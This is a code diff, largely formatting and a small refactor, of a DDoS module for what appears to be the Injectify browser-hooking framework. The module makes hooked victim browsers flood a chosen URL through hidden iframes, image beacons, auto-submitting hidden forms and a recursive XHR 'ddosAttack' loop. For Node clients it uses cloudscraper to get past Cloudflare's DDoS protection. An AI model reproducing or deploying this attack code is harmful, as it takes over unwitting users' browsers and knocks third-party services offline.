@@ -1,5 +1,5 @@
 import ModuleTypings from '../../../definitions/module'
-declare const { Module, injectify } : ModuleTypings
+declare const { Module, injectify }: ModuleTypings
 
 let request = {
   method: 'GET',
@@ -7,7 +7,7 @@ let request = {
   body: '',
   type: 'application/x-www-form-urlencoded',
   interval: 30,
-  random: true,
+  random: true
 }
 
 /**
@@ -17,9 +17,9 @@ let serialize = (obj) => {
   let str = []
   for (let p in obj)
     if (obj.hasOwnProperty(p)) {
-      str.push(`${encodeURIComponent(p)}=${encodeURIComponent(obj[p])}`);
+      str.push(`${encodeURIComponent(p)}=${encodeURIComponent(obj[p])}`)
     }
-  return str.join("&")
+  return str.join('&')
 }
 
 /**
@@ -58,7 +58,6 @@ if (typeof Module.params == 'object') {
   }
 }
 
-
 if (injectify.info.platform === 'browser') {
   /**
    * Prevent referrer from being sent in the requests
@@ -71,63 +70,72 @@ if (injectify.info.platform === 'browser') {
   if (request.url) {
     if (request.method === 'GET') {
       /**
-       * Parse the target url
-       */
-      let target = request.url
-      if (request.body || request.random) {
-        if (target.includes('?')) {
-          /**
-           * Target url already contains parameters
-           */
-          if (target.slice(-1) !== '&') target += '&'
-        } else {
-          /**
-           * Target url doesn't contain parameters
-           */
-          target += '?'
-        }
-        /**
-         * Parse the parameters
-         */
-        if (request.body) {
-          target += request.body
-          if (request.random) target += '&'
-        }
-      }
-
-      /**
        * DDoS from multiple documents
        */
 
-      injectify.module('embed', {
-        interaction: false,
-        hidden: true
-      }).then(element => {
-        element.srcdoc = `<script>setInterval(function(){ let url=${JSON.stringify(target)}${request.random}` ? '+"?"++new Date()' : `; let req = new Image(); req.src=url; /* if (typeof window.fetch === "function") window.fetch(url); */ },${request.interval * 4})</script>`
-      })
+      injectify
+        .module('embed', {
+          interaction: false,
+          hidden: true
+        })
+        .then((element) => {
+          element.srcdoc = `<script>setInterval(function(){ let url=${JSON.stringify(
+            target
+          )}${request.random}`
+            ? '+"?"++new Date()'
+            : `; let req = new Image(); req.src=url; /* if (typeof window.fetch === "function") window.fetch(url); */ },${request.interval *
+                4})</script>`
+        })
 
       /**
        * Request the target url
        */
       setInterval(() => {
-        let url = target
+        /**
+         * Parse the target url
+         */
+        let url =
+          typeof request.url === 'function' ? request.url() : request.url
+        if (request.body || request.random) {
+          if (url.includes('?')) {
+            /**
+             * Target url already contains parameters
+             */
+            if (url.slice(-1) !== '&') url += '&'
+          } else {
+            /**
+             * Target url doesn't contain parameters
+             */
+            url += '?'
+          }
+          /**
+           * Parse the parameters
+           */
+          if (request.body) {
+            url += request.body
+            if (request.random) url += '&'
+          }
+        }
+
         /**
          * Add a query string to prevent the server from sending a cached response
          */
-        if (request.random) url += +new Date
+        if (request.random && typeof request.url !== 'function')
+          url += +new Date()
+
         /**
          * Make a request
          */
-        // if (typeof window.fetch === 'function') {
-        //     window.fetch(url)
-        // }
         let req = new Image()
         req.src = url
         req.onload
       }, request.interval)
       Module.resolve()
     } else {
-      if (request.method === 'POST' && request.type === 'application/x-www-form-urlencoded') {
+      if (
+        request.method === 'POST' &&
+        request.type === 'application/x-www-form-urlencoded'
+      ) {
         /**
          * POST request through a hidden form element
          */
@@ -161,20 +169,29 @@ if (injectify.info.platform === 'browser') {
         /**
          * Make request
          */
-        injectify.module('embed', {
-          hidden: true
-        }).then(embed => {
-          embed.setAttribute('srcdoc', `<body onload="document.getElementsByTagName('form')[0].submit()">${form.outerHTML}<iframe name="${frameName}" onload="if(this.src!=='about:blank'){this.src='about:blank'}else{setTimeout(function(){document.getElementsByTagName('form')[0].submit()},${request.interval})}"/></body>`)
-        })
+        injectify
+          .module('embed', {
+            hidden: true
+          })
+          .then((embed) => {
+            embed.setAttribute(
+              'srcdoc',
+              `<body onload="document.getElementsByTagName('form')[0].submit()">${
+                form.outerHTML
+              }<iframe name="${frameName}" onload="if(this.src!=='about:blank'){this.src='about:blank'}else{setTimeout(function(){document.getElementsByTagName('form')[0].submit()},${
+                request.interval
+              })}"/></body>`
+            )
+          })
       } else {
         /**
          * Custom request
          */
-        (function ddosAttack() {
+        ;(function ddosAttack() {
           let XHR = new XMLHttpRequest()
 
           XHR.open(request.method, request.url, true)
-          XHR.setRequestHeader("Content-type", request.type)
+          XHR.setRequestHeader('Content-type', request.type)
 
           XHR.onreadystatechange = () => {
             setTimeout(ddosAttack, request.interval)
@@ -192,10 +209,10 @@ if (injectify.info.platform === 'browser') {
    * NodeJS enabled client
    * Use cloudscraper to circumvent cloudflare DDoS prevention
    */
-  let cloudscraper = eval(`require('cloudscraper')`);
-  (function ddosAttack(thread) {
+  let cloudscraper = eval(`require('cloudscraper')`)
+  ;(function ddosAttack(thread) {
     let requestUrl = request.url
-    if (request.random) requestUrl += `?${+new Date}`
+    if (request.random) requestUrl += `?${+new Date()}`
     cloudscraper.get(requestUrl, (error, response, body) => {
       /**
        * Move out of callstack
